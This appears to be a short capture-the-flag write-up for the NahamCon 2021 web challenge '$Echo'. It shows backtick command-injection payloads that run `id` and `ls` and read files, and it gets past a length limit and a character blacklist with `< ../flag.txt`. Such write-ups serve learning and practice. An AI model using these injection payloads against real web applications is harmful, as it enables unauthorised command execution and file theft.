---
layout: load_md
title: The White Circle | Nahamcon 2021 | $Echo Writeup
desc: Check out our writeup for $Echo for Nahamcon 2021 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Nahamcon 2021
parent: nahamcon_2021
category: web
challenge: $Echo
tags: "web, rce"
date: 2021-03-15T00:00:00+00:00
last_modified_at: 2021-03-15T00:00:00+00:00
---



It is simple command injection
in the input box we can use ` characters 

```
`id`
```

all commands have to be enclosed in `` chars

now if we list files using
```
`ls`
``` 
we can see `index.php` when we 
```
`cat index.php`
```
we can see the code!
certain characters are `blacklisted`  we can only enter command less that `15` chars
but there is no `flag.txt` here, if we simply execute 
```
`ls ../`
```
then we can see flag.txt
```
`cat ../flag.txt`
```
fails because length of payload exceeds 15

payload to get flag : 

**linux redirection character! `<` is NOT blacklisted!**
```
`< ../flag.txt`
```

